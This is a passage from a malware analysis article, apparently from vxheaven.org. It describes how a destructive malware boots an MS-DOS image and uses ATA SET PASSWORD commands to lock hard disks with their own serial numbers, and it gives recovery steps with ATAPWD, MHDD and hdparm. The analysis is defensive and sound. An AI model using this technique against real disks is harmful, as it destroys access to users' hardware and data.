<p>The operating system in the reco.sys image is none other than MS-DOS 7. The image contains the files needed for MS-DOS to boot and three extra files: AUTOEXEC.BAT, V.EXE and R.COM. Booting from MS-DOS ensures that no FREEZE LOCK ATA command is sent and that the disk can receive ATA security commands.</p>
<p>The autoexec.bat file executes V.EXE and then R.COM. R.COM is the MS-DOS 7 reboot utility, so the last step is rebooting. V.EXE contains the code that performs the only goal of this malware: to render the hard disk useless by protecting it with a password. It is a 17KB simple MS-DOS program compiled with Borland Turbo C. It contains a few functions to get BIOS and hard disk data, a function named SendCommands to send commands to the disk, and a SecuritySendCommands function that generates the password and then uses SendCommands to send the ATA SET PASSWORD command to the disk. The function name SecuritySendCommands, which can only send one command, suggests that this is a program developed by someone else and modified by the malware authors.</p>
<div align="center">
<img src="img/ajl01/1.png" alt="Figure 5: Fragment of the ScanDev function."/>
<p><em>Figure 5: Fragment of the ScanDev function.</em></p>
</div>
<p>The ScanDev function is of particular interest (Figure 5). In this function the IDENTIFY_DEVICE command is issued to get the serial number of identifi ed ATA disks.</p>
<p>The getserial function modifi es the serial number returned by IDENTIFY_DEVICE, stripping all spaces from it (Figure 6).</p>
<div align="center">
<img src="img/ajl01/2.png" alt="Figure 6: Fragment of the getserial function."/>
<p><em>Figure 6: Fragment of the getserial function.</em></p>
</div>
<p>For each identifi ed disk the SecuritySendCommands function is called twice, for setting both the master and user passwords. The passwords are the stored hard disk serial numbers.</p>
<p>Luckily for hard disk owners, the malware authors chose to set the password as the hard disk serial number, stripping out any spaces. Therefore, passwords can be removed from the hard disk using standard tools without having to investigate (or pay for) manufacturer non-standard ATA security commands or alternative ways to fi nd passwords. Perhaps the authors wanted to extort disk owners or perhaps they stole someone elseВ’s code for V.EXE. Even when the damage is serious, both hardware and data can be recovered.</p>
 
<h2><a name="c3"></a>Recovery</h2>
<p>Recovering before the malware delivers its payload is easy: just delete the fi les and update the registry keys. However, once the malware has delivered its payload it is impossible to recover the disk from a Windows application because of the FREEZE LOCK command sent by Windows itself. Pre-SP3 versions of Windows XP may be used, otherwise you need to boot to MS-DOS or similar to be able to send ATA commands to the disk.</p>
<p>An external tool such as ATAPWD or MHDD (both of which can be found freely on the Internet) may be used from DOS to recover protected disks. From Linux the hdparm utility may be used with one caveat: not all kernels support ATA security commands gracefully. After recovery, the boot loader ntldr, the instructions for it (reco.bin) and the MS-DOS image (reco.sys) must be deleted; otherwise the disk can become password protected again.</p>
<h2><a name="c4"></a>Conclusion</h2>
<p>This is the fi rst malware (as far as we know) that uses ATA disk security to render disks useless. It is also the fi rst to our knowledge that uses a different operating system in the same computer to achieve its purpose. It is uncommon these days to fi nd malware whose sole purpose is to cause damage. This malware seems not to have any specifi c targets; it simply attacks every computer it can. The damage caused by this malware in its current incarnation can be reverted, but it would not be diffi cult for the attackers to create a stronger password that is harder to defeat.</p>
<h2><a name="c5"></a>References</h2>
<p><a name="f1_1" href="#b1_1">1.</a> ATA/ATAPI 6 specification. <a href="http://www.t13.org/documents/UploadedDocuments/project/d1410r3b-ATA-ATAPI-6.pdf">http://www.t13.org/documents/UploadedDocuments/project/d1410r3b-ATA-ATAPI-6.pdf</a>.</p>
<p><a name="f1_2" href="#b1_2">2.</a> ATA/ATAPI command set (ATA8-ACS). <a href="http://www.t13.org/documents/UploadedDocuments/docs2008/D1699r6a-ATA8-ACS.pdf">http://www.t13.org/documents/UploadedDocuments/docs2008/D1699r6a-ATA8-ACS.pdf</a>.</p>
<p><a name="f1_3" href="#b1_3">3.</a> <a href="http://www.gnu.org/software/grub">http://www.gnu.org/software/grub</a>.</p>
<p><a name="f1_4" href="#b1_4">4.</a> <a href="http://sourceforge.net/projects/grub4dos">http://sourceforge.net/projects/grub4dos</a>.</p>
 
[<a style="" href="/lib/?lang=EN&amp;index=AN#ajl01">Back to index</a>] [<a href="/lib/ajl01.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=ajl01">de</a><a href="/lib/index.php?lang=en&amp;id=ajl01">en</a><a href="/lib/index.php?lang=es&amp;id=ajl01">es</a><a href="/lib/index.php?lang=it&amp;id=ajl01">it</a><a href="/lib/index.php?lang=fr&amp;id=ajl01">fr</a><a href="/lib/index.php?lang=pl&amp;id=ajl01">pl</a><a href="/lib/index.php?lang=ru&amp;id=ajl01">ru</a><a href="/lib/index.php?lang=ua&amp;id=ajl01">ua</a></div>
</body>
</html>
